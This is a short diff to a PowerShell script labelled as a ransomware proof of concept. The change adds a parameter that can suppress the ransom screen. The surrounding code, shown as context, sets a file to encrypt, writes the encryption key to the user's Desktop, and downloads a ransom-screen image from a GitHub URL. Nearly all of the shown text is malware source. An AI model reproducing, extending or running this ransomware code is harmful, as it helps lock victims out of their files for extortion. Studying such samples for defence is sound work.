@@ -1,4 +1,5 @@
 # BTBit Powershell Ransomware PoC 
+param([string]$showscreen)
 # file to encrypt
 $file = "test.txt"
 $drive = (get-location).Drive.Name
@@ -39,6 +40,7 @@ $userDesk = [Environment]::GetFolderPath("Desktop")
 sc -Value $key -LiteralPath "$userDesk/BTBit.key" -Encoding byte
 #
 # show encryption screen
+if ($showscreen -eq "noscreen") {exit}
 $screen = $ENV:LOCALAPPDATA + "\screen_enc.jpg"  
 (New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/screen_enc.jpg", $screen)
 sleep 10
